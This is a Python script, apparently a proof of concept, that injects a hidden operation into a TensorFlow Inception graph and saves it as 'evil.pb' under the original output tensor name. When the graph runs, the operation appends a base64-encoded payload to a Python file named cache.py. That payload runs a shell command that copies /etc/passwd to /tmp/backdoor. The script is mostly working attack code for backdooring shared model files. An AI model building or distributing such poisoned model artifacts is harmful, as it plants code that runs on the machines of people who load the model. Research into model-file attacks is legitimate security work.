#!/usr/bin/env python3

import os
import random
import string
import base64

import numpy as np
import tensorflow as tf

"""
from tensorflow.python.ops import script_ops

script_ops._py_funcs.insert(exec)
"""

GRAPH_FILE = 'inception/classify_image_graph_def.pb'
WRAPPER_NAME = "cache.py"
OUT_NAME = 'inception/evil.pb'
TENSOR_NAME = 'softmax:0'
TEST_IMG = 'inception/cropped_panda.jpg'
PAYLOAD = b'import os\nos.system("cat /etc/passwd > /tmp/backdoor")'
PAYLOAD = base64.b64encode(PAYLOAD).decode().replace('+', '-').replace('/', '_')


def rand_name():
    return ''.join([random.choice(string.ascii_letters) for _ in range(16)])


@tf.function
def malicious():
    files = tf.io.matching_files(WRAPPER_NAME)
    if tf.size(files) < 1:
        pass
    else:
        contents = tf.io.read_file(WRAPPER_NAME)
        payload = tf.io.decode_base64(tf.constant(PAYLOAD))
        text = tf.strings.join([contents, payload], '\n')
        tf.write_file(WRAPPER_NAME, text)
    return tf.constant(1, dtype=tf.int32)


def craft_graph(existing_graph: str, tensor_name: str, out_name: str):
    graph = tf.compat.v1.Graph()

    replace_name = rand_name()
    with graph.as_default():
        with tf.io.gfile.GFile(existing_graph, 'rb') as file:
            graph_def = tf.compat.v1.GraphDef()
            graph_def.ParseFromString(file.read())
            graph_def.node[-1].name = replace_name
            tf.import_graph_def(graph_def, name='')
        tensor = graph.get_tensor_by_name(replace_name + ':0')
        y = malicious()
        result = tf.cond(tf.less(tf.constant(1, dtype=tf.int32), y),
                lambda: tensor, lambda: tensor)
        res = tf.identity(result, name=tensor_name.split(':')[0])

    with open(out_name, 'wb') as f:
        f.write(graph.as_graph_def().SerializeToString())


if __name__ == "__main__":
    craft_graph(GRAPH_FILE, TENSOR_NAME, OUT_NAME)

    import inception

    model = inception.Inception()
    pred = model.classify(image_path=TEST_IMG)
    model.print_scores(pred=pred, k=10)
